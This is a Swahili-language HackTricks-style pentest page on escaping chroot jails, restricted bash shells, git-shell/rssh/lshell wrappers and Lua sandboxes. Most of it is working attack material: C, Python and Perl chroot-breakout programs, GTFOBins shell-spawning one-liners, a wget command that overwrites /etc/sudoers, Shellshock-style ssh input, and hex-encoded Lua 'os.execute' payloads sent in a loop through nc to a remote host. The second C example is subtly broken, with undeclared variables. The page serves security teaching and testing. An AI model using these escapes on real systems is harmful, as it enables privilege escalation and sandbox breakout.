# Kukimbia kutoka kwenye Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Tafuta katika** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **kama unaweza kutekeleza binary yoyote yenye sifa ya "Shell"**

## Chroot Escapes

Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Utaratibu wa chroot **haukusudiwi kulinda** dhidi ya uchakachuaji wa makusudi unaofanywa na **watumiaji wenye mamlaka** (**root**). Kwenye mifumo mingi, mazingira ya chroot hayajipangi vizuri juu ya mengine na programu zilizoko ndani ya chroot **zenye mamlaka za kutosha zinaweza kufanya chroot ya pili ili kutoroka**.\
Kwa kawaida hii inamaanisha kuwa ili kutoroka unahitaji kuwa root ndani ya chroot.

> [!TIP]
> **Kifaa** [**chw00t**](https://github.com/earthquake/chw00t) kiliundwa kutumia vibaya hali zifuatazo na kutoroka kutoka `chroot`.

### Root + CWD

> [!WARNING]
> Ikiwa wewe ni **root** ndani ya chroot **unaweza kutoroka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroot 2 haziwezi kuwepo pamoja (kwenye Linux), kwa hiyo ukitengeneza folda kisha **kuunda chroot mpya** kwenye folda hiyo mpya huku **wewe ukiwa nje yake**, sasa utakuwa **nje ya chroot mpya** na hivyo utakuwa kwenye FS.
>
> Hii hutokea kwa sababu kawaida chroot HAIHAMISHI working directory yako kwenda kwenye ile iliyoelekezwa, hivyo unaweza kuunda chroot lakini ukawa nje yake.

Kwa kawaida hutapata binary `chroot` ndani ya chroot jail, lakini **ungeweza kukompaili, kupakia na kutekeleza** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Hii ni sawa na kesi ya awali, lakini katika kesi hii **mshambulizi huhifadhi file descriptor ya saraka ya sasa** kisha **huunda chroot katika folda mpya**. Hatimaye, kwa kuwa ana **access** kwa **FD** hiyo **nje** ya chroot, anaifikia na **anatoroka**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD inaweza kupitishwa kupitia Unix Domain Sockets, hivyo:
>
> - Create mchakato wa mtoto (fork)
> - Create UDS ili parent na mtoto waweze kuwasiliana
> - Run chroot katika mchakato wa mtoto kwenye folder tofauti
> - Katika parent proc, create FD ya folder ambayo iko nje ya new child proc chroot
> - Pass kwa child procc hiyo FD kwa kutumia UDS
> - Child process chdir hadi hiyo FD, na kwa sababu iko nje ya chroot yake, ataescape jail

### Root + Mount

> [!WARNING]
>
> - Mount device ya root (/) ndani ya directory iliyo ndani ya chroot
> - Chrooting kwenda ndani ya hiyo directory
>
> Hii inawezekana katika Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs ndani ya directory iliyo ndani ya chroot (ikiwa bado haijawekwa)
> - Tafuta pid ambayo ina tofauti root/cwd entry, kama: /proc/1/root
> - Chroot kwenda kwenye hiyo entry

### Root(?) + Fork

> [!WARNING]
>
> - Create Fork (child proc) na chroot kwenda kwenye folder tofauti iliyo zaidi ndani ya FS na CD juu yake
> - Kutoka parent process, move folder ambamo child process iko kwenda folder ya awali kabla ya chroot ya watoto
> - Hii children process itajikuta iko nje ya chroot

### ptrace

> [!WARNING]
>
> - Zamani users waliweza debug processes zao wenyewe kutoka kwenye process yao wenyewe... lakini hii haipo tena by default
> - Hata hivyo, ikiwa inawezekana, unaweza ptrace kwenye process na execute shellcode ndani yake ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Pata info kuhusu jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Rekebisha PATH

Angalia kama unaweza kurekebisha PATH env variable
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Kutumia vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers na help viewers

Mazingira mengi yenye vizuizi bado huacha **pagers** au **help viewers** zikipatikana. Hizo kwa kawaida ni rahisi zaidi kuzitumia vibaya kuliko kujaribu kujenga upya `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Ikiwa `git` inapatikana, kumbuka kwamba matokeo yake ya help kawaida hupitia pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

Mara tu unapojua ni binaries zipi zinafikiwa, jaribu kwanza shell spawners zilizo wazi:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Ikiwa unaweza tu **kuingiza arguments** kwenye command iliyoruhusiwa (badala ya kuiendesha kwa uhuru), pia angalia **GTFOArgs**.

### Unda script

Angalia kama unaweza kuunda file inayotekelezeka yenye _/bin/bash_ kama content
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Pata bash kutoka SSH

Ikiwa unafikia kupitia ssh, mara nyingi unaweza kuomba server iteexecute **programu tofauti** badala ya restricted login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Ikiwa `ssh` ni mojawapo ya binaries chache zinazoruhusiwa locally, kumbuka kwamba pia inaweza kutumiwa vibaya kama **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Tangaza
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Unaweza kuandika upya kwa mfano faili ya sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Baadhi ya mazingira hayakuingizi kwenye plain `rbash`, bali kwenye **wrappers** kama `git-shell`, `rssh`, au `lshell`:

- `git-shell` hukubali tu server-side Git commands pamoja na chochote kilicho ndani ya `~/git-shell-commands/`. Kama directory hiyo ipo, endesha `help` ili kuorodhesha custom actions zinazoruhusiwa. Kama unaweza kuandika hapo, executable yoyote itakayowekwa ndani ya directory hiyo inaweza kufikiwa.
- `rssh` / `lshell` mara nyingi huruhusu tu `scp`, `sftp`, `rsync`, au Git-style operations. Katika hali hizo zingatia kwanza **file write primitives**: upload `authorized_keys`, shell startup file, au helper script kwenye location inayoweza kuandikwa kisha reconnect kwa `ssh -t ...`.
- Kama wrapper inafilter tu command line, orodhesha binaries zinazoweza kufikiwa kisha rudia kwenye **GTFOBins / GTFOArgs**.

### Other tricks

Pia angalia:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**It could also be interesting the page:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks about escaping from python jails in the following page:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Katika page hii unaweza kupata global functions unazoweza kufikia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Baadhi ya mbinu za **kuita functions za library bila kutumia dots**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerate functions of a library:
```bash
for k,v in pairs(string) do print(k,v) end
```
Kumbuka kwamba kila mara unapoendesha one liner ya awali katika **different lua environment mpangilio wa functions hubadilika**. Kwa hiyo ikiwa unahitaji kuendesha function moja mahususi unaweza kufanya brute force attack kwa kupakia different lua environments na kuita function ya kwanza ya le library:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Pata interactive lua shell**: Ikiwa uko ndani ya limited lua shell unaweza kupata new lua shell (na hopefully unlimited) ukitumia:
```bash
debug.debug()
```
## Marejeo

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
